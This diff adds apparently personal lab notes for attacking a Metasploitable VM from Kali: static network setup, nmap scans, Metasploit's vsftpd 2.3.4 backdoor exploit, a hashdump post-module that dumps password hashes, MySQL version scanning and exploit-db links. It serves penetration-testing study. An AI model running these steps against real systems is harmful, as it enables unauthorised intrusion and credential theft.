@@ -1,0 +1,45 @@
+
+--msf--
+sudo nano /etc/network/interfaces
+"iface eth0 inet static
+address 10.0.2.90
+network 10.0.2.0
+netmask 255.255.255.0"
+
+/etc/init.d/networking restart
+
+--Kali--
+ping 10.0.2.90
+nmap -sS 10.0.2.90
+nmap -sV 10.0.2.90
+
+msf6>use auxiliary/scanner/ftp/ftp_version
+msf6>setg rhosts 10.0.2.90
+msf6>run
+msf6>use exploit/unix/ftp/vsftpd_234_backdoor
+msf6>run
+'ctrl+z'
+msf6>use post/linux/gather/hashdump
+msf6>set session 1
+msf6>run
+
+-- https://www.exploit-db.com/exploits/49757
+
+
+msf6>use auxiliary/scanner/mysql/mysql_version
+msf6>setg rhosts 10.0.2.90
+msf6>run
+
+-- https://www.exploit-db.com/exploits/29724
+-- https://www.exploit-db.com/exploits/30020
+
+msf6>
+msf6>
+
+-- https://www.exploit-db.com/exploits/21002
+
+------------------------------
+SYN nmap -sS 10.0.2.90
+FIN nmap -sF 10.0.2.90
+XMAS nmap -sX 10.0.2.90
+UDP nmap -sU 10.0.2.90 
